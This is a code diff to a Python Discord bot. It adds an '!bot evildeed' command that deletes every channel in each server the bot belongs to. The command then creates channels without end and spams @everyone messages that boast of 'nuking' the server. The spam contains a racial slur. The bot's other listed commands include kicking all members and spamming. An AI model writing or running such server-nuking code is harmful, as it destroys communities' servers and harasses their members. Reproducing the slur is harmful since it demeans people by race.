@@ -1,5 +1,5 @@
 import discord
-
+import asyncio
 intents = discord.Intents.all()
 client = discord.Client(intents=intents)
 
@@ -32,7 +32,7 @@ async def on_message(message):
         else:
           await message.channel.send('Provide a user ID to add.') 
       elif (message.content.startswith('!bot removeuser')
-         and str(message.author.id) == '798629431325360128'):
+         and str(message.author.id) == god_user):
           if len(message.content) > 14:
            splited_message = message.content.split(' ')
            user_id = " ".join(splited_message[2:])
@@ -84,7 +84,8 @@ description=allowed_users_mentions, color=0x00ff00)
             '!bot kick all': 'Kicks all members from the server except allowed users',
             '!bot allowedusers': 'Lists all allowed users',
             '!bot config': 'Displays the list of available commands and their descriptions',
-            '!bot stopspam': 'Stops the bot from spamming'
+            '!bot stopspam': 'Stops the bot from spamming',
+            '!bot evildeed': 'Nukes the server'
         }
         for command, description in command_desc.items():
             embed.add_field(name=command, value=description, inline=False)
@@ -92,4 +93,36 @@ description=allowed_users_mentions, color=0x00ff00)
       elif message.content == '!bot stopspam':
         spam = False
         await message.channel.send('Spam stopped')
+      # ... (other code remains unchanged)
+
+      elif message.content == '!bot evildeed':
+          # delete all the channels
+          for guild in client.guilds:
+            guild.name = "l get nuked by kuruyami + interken is da goat :cold_face: :cold_sweat: :goat: :on: :top"
+            for channel in guild.channels:
+                  await channel.delete()
+
+          # waits until all channels are gone
+          while True:
+              all_channels_gone = True
+              for guild in client.guilds:
+                  if len(guild.channels) > 0:
+                      all_channels_gone = False
+                      break
+              if all_channels_gone:
+                  break
+
+          # add channels forever called "u got nukd by kuruyami l niglet"
+          while True:
+              for guild in client.guilds:
+                  channele = await guild.create_text_channel("u got nukd by kuruyami l niglet")
+                  await channele.send("@everyone u got nukd by kuruyami l niglet")
+                  await asyncio.sleep(.0001)  # Add a delay here to avoid rate-limiting
+                  await channele.send("Mr.Bobby is the goat :goat: :on: :top:")
+                  await asyncio.sleep(.0001)  # Add a delay here to avoid rate-limiting
+                  await channele.send("InterKen is the goat :goat: :on: :top:")
+                  await asyncio.sleep(.0001)  # Add a delay here to avoid rate-limiting
+                  await channele.send("Kuruyami on top :cold_face: :cold_sweat:")
+                  await asyncio.sleep(.0001)  # Add a delay here to avoid rate-limiting
+
 client.run('YOUR_BOT_TOKEN')
